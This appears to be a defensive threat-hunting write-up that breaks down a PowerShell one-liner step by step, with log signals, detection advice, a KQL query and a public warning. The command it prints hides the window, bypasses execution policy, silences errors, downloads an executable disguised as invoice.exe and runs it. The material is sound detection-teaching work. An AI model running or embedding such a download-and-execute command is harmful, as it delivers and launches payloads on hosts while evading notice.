# Suspicious PowerShell Activity Detected: Attempted Malicious File Download and Execution - Attack Usage

## Overview:

This sequence is built to fetch a file from a network location and run it while reducing visibility and interrupting normal security signals. What this really means is the actor is trying to automate delivery and execution while making forensic and user detection harder.
```
powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference='silentlycontinue'; (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\test-WDATP-test\invoice.exe'); Start-Process 'C:\test-WDATP-test\invoice.exe'
```

## Step 1 Start PowerShell with NoExit
**What it does:** Starting PowerShell with NoExit keeps the shell open after the command returns. The process remains alive instead of terminating immediately.

**What shows up in logs:** A long running powershell.exe process with a start time that does not match normal interactive sessions. Command line fields will include an argument that indicates the NoExit option. Event logs may show a spawn of powershell.exe with a parent process that is unusual for interactive shells.

**Why an attacker likes this:** It allows follow on commands to execute in the same session, and it can leave the process present while other actions complete. That increases the window for the payload to be downloaded and run.

**How to detect and respond:** Look for powershell.exe processes with abnormal lifetimes or nonstandard parent processes. Flag long lived PowerShell tokens that are not associated with legitimate admin sessions. If seen, collect process memory and command line arguments and isolate the host.

## Step 2 Set ExecutionPolicy to Bypass
**What it does:** Setting execution policy to bypass overrides local script execution restrictions. It removes the built in prompts or policy checks that would normally prevent unsigned or restricted scripts from running.

**What shows up in logs:** Command line parameters in process creation events will contain the execution policy argument. Script block logging, if enabled, will show the script content. Transcription files, if configured, will capture commands that ran.

**Why an attacker likes this:** Scripts and remote code run without being blocked by policy, so scripted payloads execute on locked down systems.

**How to detect and respond:** Ensure script block logging and module logging are enabled. Correlate executionpolicy command line flags with other suspicious indicators. If bypass is observed, treat the session as hostile, capture artifacts, and reset local policies where possible.

## Step 3 Run with WindowStyle Hidden
**What it does:**
Running with window style set to hidden launches the shell or script without a visible window. The action is invisible to the interactive user session.

**What shows up in logs:** No GUI evidence on the desktop. Process creation and parent process relationships still appear in telemetry. Endpoint UI event logs may show no interactive terminal, which is itself suspicious for scripted PowerShell runs.

**Why an attacker likes this:** It reduces chance of a user noticing something running, which prolongs undetected activity.

**How to detect and respond:** Search for powershell processes spawned without a visible console, especially when originating from service or scheduled task contexts. Use EDR sensors that capture process trees and window state.

## Step 4 Suppress errors with ErrorActionPreference silentlycontinue
**What it does:** Setting the error action preference to silentlycontinue hides error messages and prevents failures from drawing attention. The script continues without producing visible exceptions.

**What shows up in logs:** Fewer visible error dialogs and less interactive troubleshooting noise. Telemetry may still capture failed network connections or file write errors, but those may be suppressed at the script level.

**Why an attacker likes this:** Error suppression makes noise reduction explicit. Fewer user or admin alerts means a longer dwell time.

**How to detect and respond:** Correlate suppressed script-level behavior with other signals. Look for sequences where network requests or file writes occur without follow up error events. Enable script tracing to capture suppressed exceptions in logs.

## Step 5 Download a file via a network client object
**What it does:** The script creates a network client instance and requests a binary from a specified URL, then writes the response to disk. This moves a payload from a remote or local server into the host file system.

**What shows up in logs:** Network logs will show outbound connections to the specified IP or domain. Process creation events and file system events will show a new file being written to disk. EDR may record file write and hash data. DNS logs may reveal lookup activity.

**Why an attacker likes this:** It delivers the binary payload in a controlled way, often from a short lived or local server to reduce detection and attribution. Writing to an obfuscated or unusual path reduces immediate discovery.

**How to detect and respond:** Monitor for powershell initiated network calls, especially to uncommon internal IPs or external endpoints. Watch file creation events and immediately hash new executables. Block known malicious endpoints and quarantine any host that writes unexpected executables.

## Step 6 Execute the downloaded file with Start-Process
**What it does:** The script launches the downloaded executable as a new process. That transitions the operation from script to native binary execution, which often carries the malicious payload.

**What shows up in logs:** A new process tree node appears for the downloaded executable with its parent indicated as powershell.exe. Process creation events, command line, and image load artifacts will be present. The new binary may trigger detections or may be unsigned and untrusted.

**Why an attacker likes this:** This completes the delivery chain. The actor gets code running on the endpoint that can perform persistence, lateral movement, or data theft.

**How to detect and respond:** Detect process parentage where powershell.exe spawns unknown executables. Block execution of binaries in user-writable or temporary locations. Use application control allow lists and remove execute permissions from uncommon directories.

## Why the chain is dangerous overall
Chaining these steps hides activity, bypasses local policy, and enables automated delivery and execution. The combination increases speed and reduces chances of manual discovery. At scale this pattern is commonly used to drop shells, trojans, or loaders that enable further compromise.

---

## Tables Used to Detect IoCs:

| **Parameter**       | **Description**                                                              |
|---------------------|------------------------------------------------------------------------------|
| **Name**| DeviceProcessEvents|
| **Info**|https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceinfo-table|
| **Purpose**| Used to detect process creation activity and related indicators, the DeviceProcessEvents records parent and child relationships, full command-line arguments, launching accounts, and executable metadata. This dataset is essential for identifying malicious script or executable launches. |

---

## Related Queries:
```kql
DeviceFileEvents
| where DeviceName startswith "ARYA"
| order by Timestamp desc
| where InitiatingProcessAccountName  !in ("system", "local service")

```

---

## Created By:
- **Author Name**: Arya Davidson Ani Florance
- **Author Contact**: https://www.linkedin.com/in/arya-davidson-ani-florance/
- **Date**: September 11, 2025

## Validated By:
- **Reviewer Name**: 
- **Reviewer Contact**: 
- **Validation Date**: 

---

## Additional Notes:

Here is the thing. PowerShell is a legitimate, powerful tool for automation and system management. Its depth of access and integration into Windows also makes it attractive to attackers. Malicious actors commonly abuse PowerShell by hiding windows, bypassing execution policies, and automating downloads and execution to evade detection and gain persistence. Trusted scripts and files can be weaponized. Social engineering often lures users into running harmful commands.

## Public warning

Do not copy and paste unfamiliar commands into PowerShell. Exercise extreme caution with files or messages that instruct opening PowerShell or the Windows Run dialog. Report suspicious PowerShell activity to IT immediately and avoid further interaction with the suspect host or file. A few careless actions can lead to full system compromise.
 
## Revision History:
| **Version** | **Changes**         | **Date**              | **Modified By**   |
|-------------|---------------------|-----------------------|-------------------|
| 1.0         | Initial draft       | `September 11, 2025`  | `Arya Davidson`   |
